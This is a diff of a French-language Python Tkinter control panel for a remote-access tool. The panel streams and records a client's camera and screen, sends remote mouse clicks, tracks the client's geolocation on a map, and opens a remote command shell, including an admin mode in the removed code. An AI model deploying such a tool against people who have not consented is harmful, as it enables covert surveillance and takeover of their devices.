+                        "wait": FRAME_LONG_POLL_SECONDS,
+                    },
+                    timeout=REQUEST_TIMEOUT + 1,
+                )
+                if response.status_code == 200 and response.content:
+                    seq_header = response.headers.get("X-Frame-Seq")
+                    if seq_header is not None:
+                        try:
+                            last_seq = int(seq_header)
+                        except ValueError:
+                            pass
+                    jpeg = response.content
+                    panel.last_jpeg = jpeg
+                    # Décodage hors thread Tk (CPU) puis envoi au thread Tk
+                    array = np.frombuffer(jpeg, dtype=np.uint8)
+                    image = cv2.imdecode(array, cv2.IMREAD_COLOR)
+                    if image is not None:
+                        if panel.recorder is not None and panel.recording:
+                            panel.recorder.push(image)
+                        self._queue_display(panel, image)
+                else:
+                    time.sleep(POLL_FRAME_INTERVAL)
+            except requests.RequestException:
+                time.sleep(0.2)
+
+    def _queue_display(self, panel: StreamPanel, image: np.ndarray) -> None:
+        """Envoie l'image au thread Tk via after(). Une seule image en attente :
+        si une nouvelle arrive avant l'affichage, elle remplace la précédente
+        (pas de file qui prendrait du retard)."""
+        with panel.display_lock:
+            panel.pending_image = image
+            if panel.display_scheduled:
                 return
-            self._throttle_times[throttle_key] = now
-        self.log_queue.put(f"[{time.strftime('%H:%M:%S')}] {message}")
+            panel.display_scheduled = True
+        try:
+            self.root.after(0, self._flush_display, panel)
+        except (RuntimeError, tk.TclError):
+            with panel.display_lock:
+                panel.display_scheduled = False
+
+    def _flush_display(self, panel: StreamPanel) -> None:
+        with panel.display_lock:
+            image = panel.pending_image
+            panel.pending_image = None
+            panel.display_scheduled = False
+        if image is None:
+            return
+        try:
+            self._render_frame(panel, image)
+        except (tk.TclError, RuntimeError):
+            pass
+
+    def _render_frame(self, panel: StreamPanel, image: np.ndarray) -> None:
+        """Redimensionne l'image à la taille disponible et l'affiche.
+        Pour l'écran, dessine aussi le curseur rouge à la position souris."""
+        target_w, target_h = panel.view_size
+        if target_w < 4 or target_h < 4:
+            return
+        img_h, img_w = image.shape[:2]
+        scale = min(target_w / img_w, target_h / img_h)
+        new_w, new_h = max(1, int(img_w * scale)), max(1, int(img_h * scale))
+
+        display = image
+        if panel.key == "screen" and self.mouse_position:
+            mouse = self.mouse_position
+            mx, my = mouse.get("x"), mouse.get("y")
+            sw, sh = mouse.get("screen_w"), mouse.get("screen_h")
+            if mx is not None and my is not None and sw and sh:
+                # Coordonnées écran -> coordonnées image source -> coordonnées affichées
+                rx = mx / sw * img_w
+                ry = my / sh * img_h
+                display = image.copy()
+                cx = int(rx)
+                cy = int(ry)
+                cv2.circle(display, (cx, cy), max(4, int(img_w * 0.006)),
+                           (59, 59, 255), 2, lineType=cv2.LINE_AA)
+
+        resized = cv2.resize(display, (new_w, new_h), interpolation=cv2.INTER_AREA)
+        rgb = cv2.cvtColor(resized, cv2.COLOR_BGR2RGB)
+        pil = Image.fromarray(rgb)
+        photo = ImageTk.PhotoImage(pil)
+        panel.video_label.configure(image=photo, text="")
+        panel.video_label.image = photo   # garde une référence
+
+    def _update_location_display(self, response) -> None:
+        """Met à jour le panneau de localisation à partir de /api/location/latest."""
+        try:
+            data = response.json()
+        except ValueError:
+            return
+        browser_open = bool(data.get("browser_open"))
+        latest = data.get("latest")
+        self.location_open = browser_open
+
+        if browser_open:
+            self.location_status_var.set("● Ouverte")
+            self.location_status_label.configure(fg=COLOR_OK)
+        else:
+            self.location_status_var.set("● Fermée")
+            self.location_status_label.configure(fg=COLOR_KO)
+
+        if latest and latest.get("lat") is not None:
+            lat = float(latest["lat"])
+            lon = float(latest["lon"])
+            acc = latest.get("accuracy")
+            acc_str = f"  (± {int(acc)} m)" if acc else ""
+            self.location_coords_var.set(f"{lat:.6f}, {lon:.6f}{acc_str}")
+            if _HAS_MAP and self.location_map is not None:
+                try:
+                    if self._location_marker is None:
+                        self._location_marker = self.location_map.set_marker(
+                            lat, lon, text="Position"
+                        )
+                        self.location_map.set_position(lat, lon)
+                        self.location_map.set_zoom(15)
+                    else:
+                        self._location_marker.set_position(lat, lon)
+                        self.location_map.set_position(lat, lon)
+                except Exception:
+                    pass
+        else:
+            self.location_coords_var.set("Aucune position reçue pour le moment.")
+
+    def _update_status(self, connected: bool) -> None:
+        if connected:
+            self.status_var.set("● Connecté")
+            self.status_label.configure(fg=COLOR_OK)
+        else:
+            self.status_var.set("● Déconnecté")
+            self.status_label.configure(fg=COLOR_KO)
+
+    def _sync_buttons(self, connected: bool) -> None:
+        """Active/désactive les boutons selon l'état du client sélectionné."""
+        state = "normal" if connected else "disabled"
+        for key, panel in self.panels.items():
+            if panel.on:
+                if panel.btn_start is not None:
+                    panel.btn_start["state"] = "disabled"
+                if panel.btn_stop is not None:
+                    panel.btn_stop["state"] = state
+                panel.status_var.set("● En marche")
+                panel.status_label.configure(fg=COLOR_OK)
+            else:
+                if panel.btn_start is not None:
+                    panel.btn_start["state"] = state
+                if panel.btn_stop is not None:
+                    panel.btn_stop["state"] = "disabled"
+                panel.status_var.set("● Arrêté")
+                panel.status_label.configure(fg=COLOR_KO)
+        loc_state = state
+        if self.btn_location_open is not None:
+            self.btn_location_open["state"] = loc_state
+        if self.btn_location_close is not None:
+            self.btn_location_close["state"] = loc_state
+        for btn in (self.btn_open_cmd, self.btn_open_chat):
+            if btn is not None:
+                btn["state"] = state
+        # NOUVEAU : bouton CMD Admin — désactivé si le client n'est pas Windows
+        if self.btn_open_admin_cmd is not None:
+            device = self.devices.get(self.selected_device_id) if self.selected_device_id else None
+            is_windows = bool(device) and (device.get("platform") == "windows")
+            self.btn_open_admin_cmd["state"] = state if is_windows else "disabled"
+
+    def _sync_device_list(self, devices: dict) -> None:
+        """Met à jour la liste déroulante des appareils sans perdre la sélection."""
+        if devices == self.devices:
+            return
+        self.devices = devices
+        labels = []
+        ids = []
+        for device_id, device in devices.items():
+            status = "●" if device.get("connected") else "○"
+            label = f"{status}  {device.get('name', device_id[:8])}  ({device_id[:8]})"
+            labels.append(label)
+            ids.append(device_id)
+        try:
+            self.device_combo["values"] = labels
+        except tk.TclError:
+            return
+
+        if self.selected_device_id in ids:
+            index = ids.index(self.selected_device_id)
+            self.device_combo.current(index)
+        elif ids:
+            self.device_combo.current(0)
+            self.selected_device_id = ids[0]
+            self._log(f"Appareil sélectionné : {devices[ids[0]].get('name', ids[0])}")
+        else:
+            self.device_var.set("")
+            self.selected_device_id = None
+
+    def _on_device_selected(self, _event=None) -> None:
+        index = self.device_combo.current()
+        if index < 0:
+            return
+        device_ids = list(self.devices.keys())
+        if index >= len(device_ids):
+            return
+        self.selected_device_id = device_ids[index]
+        device = self.devices.get(self.selected_device_id)
+        if device:
+            self._log(f"Appareil sélectionné : {device.get('name', self.selected_device_id)}")
+
+    def _send_command(self, stream: str, command: str) -> None:
+        if self.selected_device_id is None:
+            self._log("Aucun appareil sélectionné")
+            return
+        try:
+            requests.post(
+                f"{self.server_url}/api/command",
+                json={"device_id": self.selected_device_id, "stream": stream, "command": command},
+                timeout=REQUEST_TIMEOUT,
+            )
+            self._log(f"Commande {command} envoyée pour {stream}")
+        except requests.RequestException as exc:
+            self._log(f"Échec de l'envoi de la commande {command} : {exc}")
+
+    def _on_screen_click(self, panel: StreamPanel, event) -> None:
+        """Convertit un clic sur l'image écran en coordonnées écran réelles."""
+        if self.selected_device_id is None:
+            return
+        if panel.video_label is None or panel.video_label.image is None:
+            return
+        # Taille affichée de l'image (via view_size et ratio réel)
+        target_w, target_h = panel.view_size
+        if target_w < 4 or target_h < 4:
+            return
+        # On se base sur la dernière image connue pour connaître le ratio
+        jpeg = panel.last_jpeg
+        if jpeg is None:
+            return
+        arr = np.frombuffer(jpeg, dtype=np.uint8)
+        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
+        if img is None:
+            return
+        img_h, img_w = img.shape[:2]
+        scale = min(target_w / img_w, target_h / img_h)
+        new_w, new_h = max(1, int(img_w * scale)), max(1, int(img_h * scale))
+        # Offset de centrage dans le label
+        offset_x = (target_w - new_w) // 2
+        offset_y = (target_h - new_h) // 2
+        x_in_img = (event.x - offset_x) / max(scale, 1e-6)
+        y_in_img = (event.y - offset_y) / max(scale, 1e-6)
+        if x_in_img < 0 or y_in_img < 0 or x_in_img >= img_w or y_in_img >= img_h:
+            return
+        # Coordonnées écran réelles via screen_w/h rapportés par le client
+        mouse = self.mouse_position or {}
+        sw, sh = mouse.get("screen_w"), mouse.get("screen_h")
+        if not sw or not sh:
+            # À défaut, on suppose que l'image EST l'écran (pas de réduction)
+            sw, sh = img_w, img_h
+        real_x = int(x_in_img / img_w * sw)
+        real_y = int(y_in_img / img_h * sh)
+        try:
+            requests.post(
+                f"{self.server_url}/api/mouse/click",
+                json={"device_id": self.selected_device_id, "x": real_x, "y": real_y},
+                timeout=REQUEST_TIMEOUT,
+            )
+            self._log(f"Clic distant envoyé : ({real_x}, {real_y})")
+        except requests.RequestException as exc:
+            self._log(f"Échec envoi du clic : {exc}")
+
+    # ------------------------------------------------------------------
+    # Enregistrement vidéo
+    # ------------------------------------------------------------------
+    def toggle_recording(self, key: str) -> None:
+        panel = self.panels[key]
+        if panel.recording:
+            self._stop_recording(key)
+        else:
+            self._start_recording(key)
+
+    def _start_recording(self, key: str) -> None:
+        panel = self.panels[key]
+        if panel.last_jpeg is None:
+            self._log("Impossible d'enregistrer : aucune image reçue pour le moment.")
+            return
+        fps = RECORD_FPS_CAMERA if key == "camera" else RECORD_FPS_SCREEN
+        default_name = f"{key}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
+        path = filedialog.asksaveasfilename(
+            title=f"Enregistrer le flux {key}",
+            defaultextension=".mp4",
+            initialfile=default_name,
+            filetypes=[("Vidéo MP4", "*.mp4"), ("Vidéo AVI", "*.avi")],
+        )
+        if not path:
+            return
+
+        recorder = VideoRecorder(
+            path, fps, log=self._log, on_fatal=lambda: self._stop_recording(key)
+        )
+        recorder.start()
+        panel.recorder = recorder
+        panel.recording = True
+        panel.btn_record.configure(text="⏹  Arrêter l'enregistrement", style="RecordOn.TButton")
+        panel.rec_badge.pack(side="right", padx=(0, 8))
+        self._log(f"Enregistrement {key} démarré : {path}")
+
+    def _stop_recording(self, key: str) -> None:
+        panel = self.panels[key]
+        recorder = panel.recorder
+        if recorder is None:
+            return
+        panel.recording = False
+        panel.recorder = None
+        panel.btn_record.configure(text="⏺  Enregistrer", style="Record.TButton")
+        try:
+            panel.rec_badge.pack_forget()
+        except tk.TclError:
+            pass
+        report = recorder.stop()
+        if report.frames_written == 0:
+            self._log(f"❌ Enregistrement {key} vide (aucune image écrite).")
+        elif not report.verified_ok:
+            self._log(
+                f"⚠ Enregistrement {key} terminé mais fichier non relisible : {report.path}"
+            )
+        else:
+            self._log(
+                f"✅ Enregistrement {key} terminé : {report.path} "
+                f"({report.frames_written} images, codec {report.codec})"
+            )
+        if report.max_std < BLACK_FRAME_STD:
+            self._log(
+                f"⚠ La vidéo {key} semble noire (écart-type max {report.max_std:.2f})."
+            )
+
+    # ------------------------------------------------------------------
+    # Journal
+    # ------------------------------------------------------------------
+    def _log(self, message: str) -> None:
+        """Ajoute une ligne au journal (thread-safe via queue)."""
+        self.log_queue.put((datetime.now().strftime("%H:%M:%S"), message))
 
     def _poll_logs(self) -> None:
         try:
             while True:
-                line = self.log_queue.get_nowait()
-                self.log_text.configure(state="normal")
-                self.log_text.insert(tk.END, line + "\n")
-                self.log_text.see(tk.END)
-                self.log_text.configure(state="disabled")
+                ts, message = self.log_queue.get_nowait()
+                self.log_text["state"] = "normal"
+                self.log_text.insert("end", f"[{ts}] ", "time")
+                tag = "err" if ("❌" in message or "erreur" in message.lower()) else (
+                    "warn" if ("⚠" in message or "échec" in message.lower()) else (
+                        "ok" if "✅" in message else ""
+                    )
+                )
+                if tag:
+                    self.log_text.insert("end", message + "\n", tag)
+                else:
+                    self.log_text.insert("end", message + "\n")
+                self.log_text.see("end")
+                self.log_text["state"] = "disabled"
         except queue.Empty:
             pass
         self.root.after(200, self._poll_logs)
 
     # ------------------------------------------------------------------
-    # Appareil
-    # ------------------------------------------------------------------
-    def _poll_devices_loop(self) -> None:
-        while True:
-            try:
-                r = requests.get(f"{self.server_url}/api/devices", timeout=REQUEST_TIMEOUT)
-                if r.status_code == 200:
-                    self.root.after(0, self._refresh_device_combo, r.json().get("devices", []))
-                    if r.json().get("devices"):
-                        self.root.after(0, lambda: self.status_var.set("● Connecté au serveur"))
-                        self.root.after(0, lambda: self.status_label.configure(fg=COLOR_OK))
-            except requests.RequestException:
-                self.root.after(0, lambda: self.status_var.set("● Serveur injoignable"))
-                self.root.after(0, lambda: self.status_label.configure(fg=COLOR_KO))
-            time.sleep(POLL_DEVICES_INTERVAL)
-
-    def _refresh_device_combo(self, devices: list) -> None:
-        current = self.device_var.get()
-        self.devices = {d["device_id"]: d for d in devices}
-        values = [
-            f"{d['name']} — {d['device_id'][:8]}"
-            + ("  ●" if d.get("connected") else "  ○")
-            for d in devices
-        ]
-        self.device_combo["values"] = values
-        if current not in values and values:
-            self.device_combo.current(0)
-            self._on_device_selected()
-        elif current in values:
-            for d in devices:
-                if current.startswith(d["name"]):
-                    self.selected_device_id = d["device_id"]
-                    break
-
-    def _on_device_selected(self, _evt=None) -> None:
-        sel = self.device_var.get()
-        for d in self.devices.values():
-            if sel.startswith(d["name"]):
-                self.selected_device_id = d["device_id"]
-                break
-        info = self.devices.get(self.selected_device_id or "")
-        if info is not None and info.get("platform") != "windows":
-            self.btn_open_admin_cmd.state(["disabled"])
-        else:
-            self.btn_open_admin_cmd.state(["!disabled"])
-
-    def _poll_status_loop(self) -> None:
-        while True:
-            device_id = self.selected_device_id
-            if device_id:
-                try:
-                    r = requests.get(f"{self.server_url}/api/status",
-                                     params={"device_id": device_id},
-                                     timeout=REQUEST_TIMEOUT)
-                    if r.status_code == 200:
-                        data = r.json()
-                        self.root.after(0, lambda d=data: self._apply_status(d))
-                except requests.RequestException:
-                    pass
-            time.sleep(POLL_STATUS_INTERVAL)
-
-    def _apply_status(self, data: dict) -> None:
-        info = self.devices.get(self.selected_device_id or "")
-        if info is not None and data.get("platform") != "windows":
-            self.btn_open_admin_cmd.state(["disabled"])
-        else:
-            self.btn_open_admin_cmd.state(["!disabled"])
-
-    def _poll_location_loop(self) -> None:
-        while True:
-            device_id = self.selected_device_id
-            if device_id:
-                try:
-                    r = requests.get(f"{self.server_url}/api/location/latest",
-                                     params={"device_id": device_id},
-                                     timeout=REQUEST_TIMEOUT)
-                    if r.status_code == 200:
-                        data = r.json()
-                        self.root.after(0, lambda d=data: self._apply_location(d))
-                except requests.RequestException:
-                    pass
-            time.sleep(POLL_LOCATION_INTERVAL)
-
-    def _apply_location(self, data: dict) -> None:
-        self.location_open = bool(data.get("browser_open"))
-        self.btn_location.configure(text="Fermer" if self.location_open else "Ouvrir")
-        latest = data.get("latest")
-        if latest:
-            self.location_status.configure(
-                text=f"{latest['lat']:.5f}, {latest['lon']:.5f}  ± {latest.get('accuracy', '?')} m"
-            )
-            if self.map_view is not None:
-                try:
-                    if self._location_marker is None:
-                        self._location_marker = self.map_view.set_marker(
-                            latest["lat"], latest["lon"], text="Client")
-                    else:
-                        self._location_marker.set_position(latest["lat"], latest["lon"])
-                    self.map_view.set_position(latest["lat"], latest["lon"])
-                    if self.map_view.zoom < 12:
-                        self.map_view.set_zoom(14)
-                except Exception:
-                    pass
-
-    def _toggle_location(self) -> None:
-        device_id = self.selected_device_id
-        if not device_id:
-            return
-        command = "CLOSE" if self.location_open else "OPEN"
-        try:
-            requests.post(f"{self.server_url}/api/location/command",
-                          json={"device_id": device_id, "command": command},
-                          timeout=REQUEST_TIMEOUT)
-        except requests.RequestException as exc:
-            self._log(f"Localisation : {exc}")
-
-    # ------------------------------------------------------------------
-    # Flux vidéo
-    # ------------------------------------------------------------------
-    def _poll_frame_loop(self, key: str) -> None:
-        after_seq = None
-        while True:
-            device_id = self.selected_device_id
-            if not device_id:
-                time.sleep(POLL_FRAME_INTERVAL)
-                continue
-            try:
-                params = {"device_id": device_id, "stream": key}
-                if after_seq is not None:
-                    params["after"] = after_seq
-                if FRAME_LONG_POLL_SECONDS > 0:
-                    params["wait"] = FRAME_LONG_POLL_SECONDS
-                r = requests.get(f"{self.server_url}/api/frame/latest",
-                                  params=params, timeout=REQUEST_TIMEOUT)
-                if r.status_code == 200 and r.content:
-                    seq = r.headers.get("X-Frame-Seq")
-                    if seq is not None:
-                        after_seq = int(seq)
-                    jpeg = r.content
-                    self.root.after(0, lambda k=key, j=jpeg: self._apply_frame(k, j))
-                elif r.status_code == 204:
-                    pass
-            except requests.RequestException:
-                pass
-            time.sleep(POLL_FRAME_INTERVAL)
-
-    def _apply_frame(self, key: str, jpeg: bytes) -> None:
-        panel = self.panels[key]
-        panel.last_jpeg = jpeg
-        if panel.recording and panel.recorder is not None:
-            try:
-                arr = cv2.imdecode(np.frombuffer(jpeg, dtype=np.uint8), cv2.IMREAD_COLOR)
-                if arr is not None:
-                    panel.recorder.push(arr)
-            except Exception:
-                pass
-        try:
-            image = Image.open(io.BytesIO(jpeg)).convert("RGB")
-        except Exception:
-            return
-        width = panel.video_label.winfo_width() or panel.view_size[0]
-        height = panel.video_label.winfo_height() or panel.view_size[1]
-        if width < 10 or height < 10:
-            return
-        ratio = min(width / image.width, height / image.height)
-        new_size = (max(1, int(image.width * ratio)), max(1, int(image.height * ratio)))
-        image = image.resize(new_size, Image.BILINEAR)
-        panel.pending_image = ImageTk.PhotoImage(image)
-        if not panel.display_scheduled:
-            panel.display_scheduled = True
-            self.root.after(15, lambda k=key: self._flush_display(k))
-
-    def _flush_display(self, key: str) -> None:
-        panel = self.panels[key]
-        with panel.display_lock:
-            image = panel.pending_image
-            panel.pending_image = None
-            panel.display_scheduled = False
-        if image is not None and panel.video_label is not None:
-            panel.video_label.configure(image=image)
-            panel.video_label.image = image
-
-    def _set_stream(self, key: str, command: str) -> None:
-        device_id = self.selected_device_id
-        if not device_id:
-            return
-        try:
-            requests.post(f"{self.server_url}/api/command",
-                          json={"device_id": device_id, "stream": key, "command": command},
-                          timeout=REQUEST_TIMEOUT)
-            panel = self.panels[key]
-            panel.status_var.set("Actif" if command == "START" else "Arrêté")
-            panel.status_label.configure(fg=COLOR_OK if command == "START" else COLOR_MUTED)
-        except requests.RequestException as exc:
-            self._log(f"Flux {key} : {exc}")
-
-    def _on_video_click(self, key: str, event: tk.Event) -> None:
-        if key != "screen" or not self.mouse_position:
-            return
-        panel = self.panels[key]
-        img_w = panel.video_label.winfo_width()
-        img_h = panel.video_label.winfo_height()
-        mouse = self.mouse_position
-        sw = mouse.get("screen_w") or img_w
-        sh = mouse.get("screen_h") or img_h
-        if img_w == 0 or img_h == 0:
-            return
-        x = int(event.x * sw / img_w)
-        y = int(event.y * sh / img_h)
-        device_id = self.selected_device_id
-        if not device_id:
-            return
-        try:
-            requests.post(f"{self.server_url}/api/mouse/click",
-                          json={"device_id": device_id, "x": x, "y": y},
-                          timeout=REQUEST_TIMEOUT)
-        except requests.RequestException as exc:
-            self._log(f"Clic : {exc}")
-
-    def _toggle_record(self, key: str) -> None:
-        panel = self.panels[key]
-        if not panel.recording:
-            path = filedialog.asksaveasfilename(
-                defaultextension=".mp4",
-                filetypes=[("Vidéo MP4", "*.mp4"), ("Vidéo AVI", "*.avi")],
-                title=f"Enregistrer le flux {key}",
-            )
-            if not path:
-                return
-            fps = RECORD_FPS_CAMERA if key == "camera" else RECORD_FPS_SCREEN
-            panel.recorder = VideoRecorder(path, fps, log=self._log, on_fatal=None)
-            panel.recorder.start()
-            panel.recording = True
-            panel.btn_record.configure(text="■  Arrêter l'enregistrement")
-            panel.rec_badge.configure(text="● REC")
-        else:
-            report = panel.recorder.stop() if panel.recorder else None
-            panel.recording = False
-            panel.recorder = None
-            panel.btn_record.configure(text="●  Enregistrer")
-            panel.rec_badge.configure(text="")
-            if report is not None:
-                self._log(
-                    f"Enregistrement {key} : {report.frames_written} images — "
-                    f"{report.path} ({'OK' if report.verified_ok else '⚠ vide'})"
-                )
-
-    # ------------------------------------------------------------------
-    # Souris
-    # ------------------------------------------------------------------
-    def _poll_mouse_loop(self) -> None:
-        while True:
-            device_id = self.selected_device_id
-            if device_id:
-                try:
-                    r = requests.get(f"{self.server_url}/api/mouse/latest",
-                                      params={"device_id": device_id},
-                                      timeout=REQUEST_TIMEOUT)
-                    if r.status_code == 200:
-                        data = r.json()
-                        self.root.after(0, lambda d=data: self._apply_mouse(d))
-                except requests.RequestException:
-                    pass
-            time.sleep(POLL_MOUSE_INTERVAL)
-
-    def _apply_mouse(self, data: dict) -> None:
-        self.mouse_position = data
-
-    # ------------------------------------------------------------------
-    # Téléchargement client
+    # Téléchargement du client
     # ------------------------------------------------------------------
     def download_client_installer(self) -> None:
         try:
-            r = requests.get(f"{self.server_url}/download/windows",
-                             timeout=DOWNLOAD_TIMEOUT, allow_redirects=True)
-            if r.status_code == 200:
-                path = filedialog.asksaveasfilename(
-                    defaultextension=".exe",
-                    filetypes=[("Installateur", "*.exe"), ("Tous", "*.*")],
-                    title="Enregistrer l'installateur",
-                    initialfile="CameraClient-Setup.exe",
-                )
-                if not path:
-                    return
-                Path(path).write_bytes(r.content)
-                self._log(f"Installateur enregistré : {path}")
-            else:
-                self._log(f"Téléchargement échoué : HTTP {r.status_code}")
+            url = f"{self.server_url}/download/windows"
+            response = requests.get(url, timeout=DOWNLOAD_TIMEOUT, allow_redirects=True)
+            response.raise_for_status()
+            path = filedialog.asksaveasfilename(
+                title="Enregistrer l'installateur du client",
+                defaultextension=".exe",
+                initialfile="CameraClient-Setup.exe",
+                filetypes=[("Installateur Windows", "*.exe"), ("Tous les fichiers", "*.*")],
+            )
+            if not path:
+                return
+            Path(path).write_bytes(response.content)
+            self._log(f"Installateur téléchargé : {path}")
         except requests.RequestException as exc:
-            self._log(f"Téléchargement échoué : {exc}")
+            self._log(f"Échec du téléchargement de l'installateur : {exc}")
 
     # ------------------------------------------------------------------
-    # Fenêtres CMD (user / admin) et Chat
+    # CMD Commandes (fenêtre GUI par appareil)
     # ------------------------------------------------------------------
     def _open_cmd_window_for_selected(self) -> None:
-        device_id = self.selected_device_id
-        if not device_id:
-            self._log("Sélectionnez d'abord un appareil.")
+        if self.selected_device_id is None:
+            self._log("Aucun appareil sélectionné")
             return
-        self._open_cmd_window(device_id, mode="user")
+        self._open_cmd_window(self.selected_device_id)
 
-    def _open_admin_cmd_window_for_selected(self) -> None:
-        device_id = self.selected_device_id
-        if not device_id:
-            self._log("Sélectionnez d'abord un appareil.")
-            return
-        info = self.devices.get(device_id, {})
-        if info.get("platform") != "windows":
-            self._log("CMD Admin indisponible : le client n'est pas sous Windows.")
-            return
-        self._open_cmd_window(device_id, mode="admin")
-
-    def _open_chat_window_for_selected(self) -> None:
-        device_id = self.selected_device_id
-        if not device_id:
-            self._log("Sélectionnez d'abord un appareil.")
-            return
-        self._open_chat_window(device_id)
-
-    def _open_cmd_window(self, device_id: str, mode: str = "user") -> None:
-        registry = self._cmd_windows if mode == "user" else self._admin_cmd_windows
-        win = registry.get(device_id)
-        if win is not None and win.winfo_exists():
-            win.deiconify()
-            win.lift()
+    def _open_cmd_window(self, device_id: str) -> None:
+        existing = self._cmd_windows.get(device_id)
+        if existing is not None and existing.winfo_exists():
+            existing.lift()
+            existing.focus_force()
             return
 
-        name = self.devices.get(device_id, {}).get("name", device_id[:8])
-        label = "CMD Admin" if mode == "admin" else "CMD"
-        title = f"{label} — {name}"
         win = tk.Toplevel(self.root)
-        win.title(title)
+        win.title(f"CMD distant — {device_id[:8]}")
         win.geometry("820x520")
         win.configure(bg=COLOR_BG)
+        self._cmd_windows[device_id] = win
 
         top = tk.Frame(win, bg=COLOR_BG)
-        top.pack(fill="x", padx=10, pady=(10, 4))
-        state_var = tk.StringVar(value="Fermé")
+        top.pack(fill="x", padx=10, pady=(10, 0))
+        state_var = tk.StringVar(value="Console distante : ● fermée")
         tk.Label(top, textvariable=state_var, bg=COLOR_BG, fg=COLOR_MUTED,
                  font=(FONT, 9, "bold")).pack(side="left")
 
-        text = tk.Text(win, bg="#07090f", fg="#d8e0ff", insertbackground=COLOR_TEXT,
-                       font=(FONT_MONO, 9), wrap="none", state="disabled",
-                       highlightthickness=0, borderwidth=0)
-        text.pack(fill="both", expand=True, padx=10, pady=4)
-
-        bottom = tk.Frame(win, bg=COLOR_BG)
-        bottom.pack(fill="x", padx=10, pady=(4, 10))
-        entry = ttk.Entry(bottom, font=(FONT_MONO, 10))
-        entry.pack(side="left", fill="x", expand=True, ipady=3)
-
-        if mode == "admin":
-            input_url = f"{self.server_url}/api/shell/admin/input"
-            state_url = f"{self.server_url}/api/shell/admin/console/state"
-            output_url = f"{self.server_url}/api/shell/admin/output/latest"
-            control_url = f"{self.server_url}/api/shell/admin/console"
-        else:
-            input_url = f"{self.server_url}/api/shell/input"
-            state_url = f"{self.server_url}/api/shell/console/state"
-            output_url = f"{self.server_url}/api/shell/output/latest"
-            control_url = f"{self.server_url}/api/shell/console"
-
-        def send_command(_evt=None):
-            cmd = entry.get()
-            if not cmd:
-                return
+        def open_remote():
             try:
-                requests.post(input_url,
-                              json={"device_id": device_id, "text": cmd + "\r\n"},
-                              timeout=REQUEST_TIMEOUT)
+                requests.post(
+                    f"{self.server_url}/api/shell/console",
+                    json={"device_id": device_id, "command": "OPEN"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Console distante : ouverture demandée")
             except requests.RequestException as exc:
-                self._log(f"{label} : envoi impossible ({exc})")
-            entry.delete(0, tk.END)
+                self._log(f"Échec : {exc}")
+
+        def close_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/console",
+                    json={"device_id": device_id, "command": "CLOSE"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Console distante : fermeture demandée")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        ttk.Button(top, text="▶ Ouvrir chez le client", style="Start.TButton",
+                   command=open_remote).pack(side="right", padx=(6, 0))
+        ttk.Button(top, text="■ Fermer chez le client", style="Stop.TButton",
+                   command=close_remote).pack(side="right")
+
+        output = tk.Text(
+            win, bg=COLOR_VIDEO_BG, fg="#d0d7ee", font=(FONT_MONO, 10),
+            insertbackground=COLOR_TEXT, relief="flat", wrap="char", state="disabled",
+        )
+        output.pack(fill="both", expand=True, padx=10, pady=(8, 6))
+
+        entry_frame = tk.Frame(win, bg=COLOR_BG)
+        entry_frame.pack(fill="x", padx=10, pady=(0, 10))
+        prompt_var = tk.StringVar(value="C:\\>")
+        tk.Label(entry_frame, textvariable=prompt_var, bg=COLOR_BG, fg=COLOR_CAMERA,
+                 font=(FONT_MONO, 10, "bold")).pack(side="left")
+        cmd_var = tk.StringVar()
+        entry = ttk.Entry(entry_frame, textvariable=cmd_var, font=(FONT_MONO, 10))
+        entry.pack(side="left", fill="x", expand=True, ipady=4, padx=(6, 0))
+        entry.focus_set()
+
+        def send_command(event=None):
+            cmd = cmd_var.get()
+            if not cmd.strip():
+                return
+            cmd_var.set("")
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/input",
+                    json={"device_id": device_id, "text": cmd},
+                    timeout=REQUEST_TIMEOUT,
+                )
+            except requests.RequestException as exc:
+                self._log(f"Erreur envoi commande : {exc}")
 
         entry.bind("<Return>", send_command)
 
-        btns = tk.Frame(bottom, bg=COLOR_BG)
-        btns.pack(side="right", padx=(8, 0))
-        ttk.Button(btns, text="Ouvrir", style="Primary.TButton",
-                   command=lambda: requests.post(control_url,
-                                                  json={"device_id": device_id,
-                                                        "command": "OPEN"},
-                                                  timeout=REQUEST_TIMEOUT)).pack(side="left", padx=(0, 6))
-        ttk.Button(btns, text="Fermer",
-                   command=lambda: requests.post(control_url,
-                                                  json={"device_id": device_id,
-                                                        "command": "CLOSE"},
-                                                  timeout=REQUEST_TIMEOUT)).pack(side="left")
+        last_seq = {"value": -1}
 
-        last_seq = {"v": None}
-
-        def poll():
+        def refresh():
             if not win.winfo_exists():
+                self._cmd_windows.pop(device_id, None)
                 return
             try:
-                r = requests.get(output_url,
-                                  params={"device_id": device_id,
-                                          "after": last_seq["v"], "wait": 0.5},
-                                  timeout=REQUEST_TIMEOUT)
-                if r.status_code == 200:
-                    data = r.json()
-                    last_seq["v"] = data.get("seq")
-                    buf = data.get("buffer") or ""
-                    text.configure(state="normal")
-                    text.delete("1.0", tk.END)
-                    text.insert("1.0", buf)
-                    text.see(tk.END)
-                    text.configure(state="disabled")
-                    if mode == "admin" and data.get("admin_refused"):
-                        state_var.set("⚠ UAC refusé par l'utilisateur du client")
-                    elif data.get("console_open"):
-                        state_var.set(f"Ouvert ({mode})")
-                    else:
-                        state_var.set("Fermé")
+                resp = requests.get(
+                    f"{self.server_url}/api/shell/output/latest",
+                    params={"device_id": device_id, "after": last_seq["value"], "wait": 1.0},
+                    timeout=3,
+                )
+                if resp.status_code == 200:
+                    data = resp.json()
+                    if data["seq"] != last_seq["value"]:
+                        last_seq["value"] = data["seq"]
+                        output["state"] = "normal"
+                        output.delete("1.0", "end")
+                        output.insert("end", data["buffer"])
+                        output.see("end")
+                        output["state"] = "disabled"
+                    state_var.set(
+                        "Console distante : " + ("● ouverte" if data["console_open"] else "● fermée")
+                    )
             except requests.RequestException:
                 pass
-            win.after(600, poll)
+            win.after(SHELL_OUTPUT_POLL_INTERVAL_MS, refresh)
 
-        win.after(200, poll)
-        win.protocol("WM_DELETE_WINDOW", win.destroy)
-        registry[device_id] = win
+        refresh()
+        output["state"] = "normal"
+        output.insert("end", "Cliquez sur « Ouvrir chez le client » pour démarrer la console.\n")
+        output["state"] = "disabled"
+        # Fermer la fenêtre GUI NE ferme PAS la console distante.
